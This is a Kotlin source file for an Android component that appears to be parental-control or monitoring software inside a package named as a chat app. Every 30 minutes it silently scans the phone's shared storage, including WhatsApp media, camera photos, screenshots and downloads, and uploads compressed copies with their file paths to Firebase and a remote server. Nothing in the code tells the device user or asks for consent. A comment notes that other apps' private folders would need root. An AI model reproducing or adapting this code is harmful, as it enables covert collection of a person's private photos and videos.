package com.anonchat.app.parentalcontrol.manager

import android.content.ContentUris
import android.content.Context
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Matrix
import android.net.Uri
import android.provider.MediaStore
import android.util.Log
import androidx.exifinterface.media.ExifInterface
import com.anonchat.app.parentalcontrol.api.ApiClient
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.ConcurrentHashMap

/**
 * Scans shared storage (MediaStore) for new images/videos — WhatsApp media
 * (Android/media/com.whatsapp/...), camera (DCIM), screenshots, downloads —
 * and uploads them to the server's existing /api/report/media endpoint.
 *
 * Constraints:
 *  - Only shared storage is readable on Android 11+; app-private folders
 *    (Instagram DMs, Telegram) are NOT accessible without root.
 *  - Images are downscaled to <=1280px JPEG so uploads stay ~100-300 KB.
 *  - Videos larger than MAX_VIDEO_BYTES are recorded as metadata-only rows.
 *  - Every processed content URI is remembered in prefs -> no re-uploads.
 *  - Batched every 30 min; invoked from TrackerService + WorkManager.
 */
class MediaCollectionManager private constructor(private val context: Context) {

    companion object {
        private const val TAG = "MediaCollection"
        private const val PREFS_FILE = "kidguard_media"
        private const val KEY_UPLOADED = "uploaded_uris"
        private const val KEY_LAST_SCAN = "last_scan_ms"

        const val SCAN_INTERVAL_MS = 30 * 60 * 1000L          // 30 min normal scan
        const val FIRST_RUN_CATCHUP_MS = 24 * 60 * 60 * 1000L // first run: 24h backfill
        private const val MAX_IMAGE_DIM = 1280
        private const val MAX_IMAGE_BYTES = 400L * 1024
        private const val MAX_VIDEO_BYTES = 12L * 1024 * 1024
        private const val MAX_UPLOADS_PER_RUN = 12
        private const val MAX_TRACKED_URIS = 4000

        @Volatile private var instance: MediaCollectionManager? = null

        fun getInstance(ctx: Context): MediaCollectionManager =
            instance ?: synchronized(this) {
                instance ?: MediaCollectionManager(ctx.applicationContext).also { instance = it }
            }

        /** Safe entry point for TrackerService / WorkManager. */
        fun maybeScanAndUpload(ctx: Context) {
            try {
                getInstance(ctx).scanAndUpload()
            } catch (e: Exception) {
                Log.e(TAG, "Media scan failed: ${e.message}")
            }
        }
    }

    private val prefs: SharedPreferences =
        context.getSharedPreferences(PREFS_FILE, Context.MODE_PRIVATE)
    private val uploaded = ConcurrentHashMap<String, Long>()
    private var loaded = false
    private var uploading = false

    private fun ensureLoaded() {
        if (loaded) return
        synchronized(this) {
            if (loaded) return
            val raw = prefs.getString(KEY_UPLOADED, "") ?: ""
            raw.split("|").forEach { entry ->
                val idx = entry.lastIndexOf(':')
                if (idx > 0) {
                    val uri = entry.substring(0, idx)
                    val ts = entry.substring(idx + 1).toLongOrNull() ?: 0L
                    if (uri.isNotBlank()) uploaded[uri] = ts
                }
            }
            loaded = true
        }
    }

    private fun markUploaded(uri: String) {
        uploaded[uri] = System.currentTimeMillis()
        if (uploaded.size > MAX_TRACKED_URIS) {
            val keep = uploaded.entries.sortedBy { it.value }
                .drop(uploaded.size / 2).associate { it.key to it.value }
            uploaded.clear(); uploaded.putAll(keep)
        }
        prefs.edit().putString(KEY_UPLOADED,
            uploaded.entries.joinToString("|") { "${it.key}:${it.value}" }).apply()
    }

    fun scanAndUpload(force: Boolean = false) {
        if (uploading) return
        val now = System.currentTimeMillis()
        val last = prefs.getLong(KEY_LAST_SCAN, 0L)
        if (!force && last != 0L && now - last < SCAN_INTERVAL_MS) return
        synchronized(this) { if (uploading) return; uploading = true }
        try {
            ensureLoaded()
            val since = if (last == 0L) now - FIRST_RUN_CATCHUP_MS else last
            val newUris = queryNewMedia(since)
            Log.d(TAG, "Media scan: ${newUris.size} new items since $since")
            var uploadedCount = 0
            for (item in newUris) {
                if (uploadedCount >= MAX_UPLOADS_PER_RUN) break
                if (uploaded.containsKey(item.uri)) continue
                val ok = if (item.isVideo) uploadVideo(item) else uploadImage(item)
                if (ok) { markUploaded(item.uri); uploadedCount++ }
            }
            prefs.edit().putLong(KEY_LAST_SCAN, now).apply()
            Log.d(TAG, "Media scan done: uploaded $uploadedCount/${newUris.size}")
        } catch (e: Exception) {
            Log.e(TAG, "scanAndUpload error: ${e.message}")
        } finally {
            uploading = false
        }
    }
    private data class MediaItem(val uri: String, val isVideo: Boolean, val dateTaken: Long,
                                 val size: Long, val mime: String, val relativePath: String)

    private fun queryNewMedia(sinceMs: Long): List<MediaItem> {
        val out = mutableListOf<MediaItem>()
        val collection = MediaStore.Files.getContentUri("external")
        val proj = arrayOf(
            MediaStore.Files.FileColumns._ID,
            MediaStore.Files.FileColumns.MEDIA_TYPE,
            MediaStore.Files.FileColumns.DATE_ADDED,
            MediaStore.Files.FileColumns.SIZE,
            MediaStore.Files.FileColumns.MIME_TYPE,
            MediaStore.Files.FileColumns.RELATIVE_PATH
        )
        val sel = "${MediaStore.Files.FileColumns.DATE_ADDED} >= ? AND " +
            "${MediaStore.Files.FileColumns.MEDIA_TYPE} IN (?, ?)"
        val selArgs = arrayOf(
            (sinceMs / 1000).toString(),
            MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE.toString(),
            MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO.toString()
        )
        try {
            context.contentResolver.query(collection, proj, sel, selArgs,
                "${MediaStore.Files.FileColumns.DATE_ADDED} DESC")?.use { c ->
                val idC = c.getColumnIndexOrThrow(MediaStore.Files.FileColumns._ID)
                val typeC = c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.MEDIA_TYPE)
                val dateC = c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATE_ADDED)
                val sizeC = c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.SIZE)
                val mimeC = c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.MIME_TYPE)
                val pathC = c.getColumnIndex(MediaStore.Files.FileColumns.RELATIVE_PATH)
                while (c.moveToNext()) {
                    val id = c.getLong(idC)
                    val isVideo = c.getInt(typeC) == MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO
                    val uriStr = ContentUris.withAppendedId(
                        if (isVideo) MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                        else MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id).toString()
                    out.add(MediaItem(
                        uri = uriStr, isVideo = isVideo,
                        dateTaken = c.getLong(dateC) * 1000L,
                        size = c.getLong(sizeC),
                        mime = c.getString(mimeC) ?: if (isVideo) "video/mp4" else "image/jpeg",
                        relativePath = if (pathC >= 0) c.getString(pathC) ?: "" else ""
                    ))
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "queryNewMedia error: ${e.message}")
        }
        return out
    }
    private fun decodeDownscaled(uri: Uri): Bitmap? {
        return try {
            val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            context.contentResolver.openInputStream(uri)?.use {
                BitmapFactory.decodeStream(it, null, bounds)
            }
            var sample = 1
            while (bounds.outWidth / (sample * 2) >= MAX_IMAGE_DIM ||
                bounds.outHeight / (sample * 2) >= MAX_IMAGE_DIM) sample *= 2
            val opts = BitmapFactory.Options().apply { inSampleSize = sample }
            val bmp = context.contentResolver.openInputStream(uri)?.use {
                BitmapFactory.decodeStream(it, null, opts)
            } ?: return null
            val rotation = try {
                context.contentResolver.openInputStream(uri)?.use {
                    when (ExifInterface(it).getAttributeInt(ExifInterface.TAG_ORIENTATION, 1)) {
                        6 -> 90f; 3 -> 180f; 8 -> 270f
                        else -> 0f
                    }
                } ?: 0f
            } catch (_: Exception) { 0f }
            val scaled = if (bmp.width > MAX_IMAGE_DIM || bmp.height > MAX_IMAGE_DIM) {
                val scale = MAX_IMAGE_DIM.toFloat() / maxOf(bmp.width, bmp.height)
                Bitmap.createScaledBitmap(bmp,
                    (bmp.width * scale).toInt().coerceAtLeast(1),
                    (bmp.height * scale).toInt().coerceAtLeast(1), true)
            } else bmp
            if (rotation != 0f) {
                val m = Matrix().apply { postRotate(rotation) }
                Bitmap.createBitmap(scaled, 0, 0, scaled.width, scaled.height, m, true)
            } else scaled
        } catch (e: Exception) {
            Log.e(TAG, "decode error: ${e.message}"); null
        }
    }
    private fun bitmapToJpegBytes(bmp: Bitmap): ByteArray? {
        var quality = 82
        while (quality >= 40) {
            val bos = ByteArrayOutputStream()
            bmp.compress(Bitmap.CompressFormat.JPEG, quality, bos)
            val bytes = bos.toByteArray()
            if (bytes.size <= MAX_IMAGE_BYTES || quality == 40) return bytes
            quality -= 12
        }
        return null
    }

    private fun uploadImage(item: MediaItem): Boolean {
        val bmp = decodeDownscaled(Uri.parse(item.uri)) ?: return false
        val bytes = bitmapToJpegBytes(bmp) ?: return false
        return doUpload(bytes, "image/jpeg", item, "image")
    }
    private fun uploadVideo(item: MediaItem): Boolean {
        if (item.size > MAX_VIDEO_BYTES) {
            return doUpload(null, item.mime, item, "video") // metadata-only
        }
        return try {
            val bytes = context.contentResolver.openInputStream(Uri.parse(item.uri))
                ?.use { it.readBytes() } ?: return false
            if (bytes.size > MAX_VIDEO_BYTES) {
                return doUpload(null, item.mime, item, "video")
            }
            doUpload(bytes, item.mime, item, "video")
        } catch (e: Exception) {
            Log.e(TAG, "video read error: ${e.message}"); false
        }
    }

    private fun doUpload(bytes: ByteArray?, mime: String, item: MediaItem, mediaType: String): Boolean {
        return try {
            val meta = JSONObject().apply {
                put("source_path", item.relativePath)
                put("content_uri", item.uri)
                put("original_size", item.size)
                put("bytes_uploaded", bytes?.size ?: 0)
            }
            val filename = "media_${item.dateTaken}.${if (mediaType == "video") "mp4" else "jpg"}"

            // 1) Preferred path: Firebase Storage — persistent (survives Render
            //    redeploys), ~5 GB free. Falls back to Render multipart upload
            //    (ephemeral disk) when Firebase Storage isn't enabled yet.
            if (bytes != null) {
                val tmp = java.io.File.createTempFile("kg_up", ".tmp")
                    .apply { writeBytes(bytes); deleteOnExit() }
                val firebaseUrl = kotlinx.coroutines.runBlocking(kotlinx.coroutines.Dispatchers.IO) {
                    FirebaseManager.uploadMediaFile(tmp, mediaType)
                }
                if (firebaseUrl != null) {
                    meta.put("storage_url", firebaseUrl)
                    // Bytes already live in Firebase — report metadata only;
                    // the server stores the URL in file_path and /api/files
                    // redirects the gallery to it.
                    return ApiClient.uploadMediaFile(
                        null, filename, mime, mediaType, item.dateTaken, meta.toString()
                    )
                }
            }

            // 2) Fallback: bytes (or metadata-only for oversized videos)
            //    straight to Render.
            ApiClient.uploadMediaFile(
                bytes, filename, mime, mediaType, item.dateTaken, meta.toString()
            )
        } catch (e: Exception) {
            Log.e(TAG, "upload error: ${e.message}"); false
        }
    }
}
